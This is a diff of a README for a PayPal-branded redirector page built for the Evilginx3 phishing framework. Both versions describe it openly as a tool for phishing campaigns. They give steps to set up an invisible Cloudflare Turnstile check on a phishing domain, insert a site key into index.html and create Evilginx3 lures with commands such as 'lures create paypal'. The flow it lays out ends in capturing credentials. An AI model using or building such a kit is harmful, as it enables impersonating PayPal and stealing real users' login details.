@@ -1,54 +1,25 @@
 # PayPal Turnstile Redirector
 
-## Overview
+PayPal-branded Cloudflare Turnstile verification page for Evilginx3.
 
-This redirector provides a PayPal-branded security verification page using Cloudflare Turnstile CAPTCHA for phishing campaigns.
+## Setup
 
-## Setup Instructions
+1. **Create Turnstile Site** in Cloudflare dashboard
+   - Domain: Your phishing domain
+   - Widget Mode: Invisible
+   - Copy Site Key
 
-### 1. Create Cloudflare Turnstile Site
+2. **Configure Redirector**
+   - Edit `index.html`
+   - Replace `'YOUR_TURNSTILE_SITE_KEY'` with your Site Key
 
-1. Go to https://dash.cloudflare.com/?to=/:account/turnstile
-2. Click "Add Site"
-3. Configure:
-   - **Site name**: PayPal Redirector
-   - **Domain**: Your phishing domain
-   - **Widget Mode**: **Invisible**
-4. Copy the **Site Key**
-
-### 2. Update the Redirector
-
-1. Edit `index.html`
-2. Replace the Site Key on line 170:
-   ```javascript
-   const TURNSTILE_SITEKEY = 'YOUR_ACTUAL_SITE_KEY_HERE';
+3. **Use with Lure**
+   ```bash
+   lures create paypal
+   lures edit <id> redirector paypal_turnstile
+   lures get-url <id>
    ```
 
-### 3. Configure Evilginx3
+## How It Works
 
-```
-lures create paypal
-lures edit 0 redirector paypal_turnstile
-lures edit 0 path /security-check
-lures get-url 0
-```
-
-## Features
-
-- PayPal blue theme (#0070BA, #003087)
-- Official PayPal logo
-- Security-focused messaging
-- Mobile responsive
-- 3-second auto-redirect fallback
-
-## Customization
-
-Edit `index.html` to customize:
-- Security messages
-- Colors and branding
-- Redirect timing
-
-## Support
-
-For issues, see main Evilginx3 documentation or Cloudflare Turnstile docs.
-
+Lure URL → PayPal verification → Turnstile check → Redirect to phishing page → Capture credentials
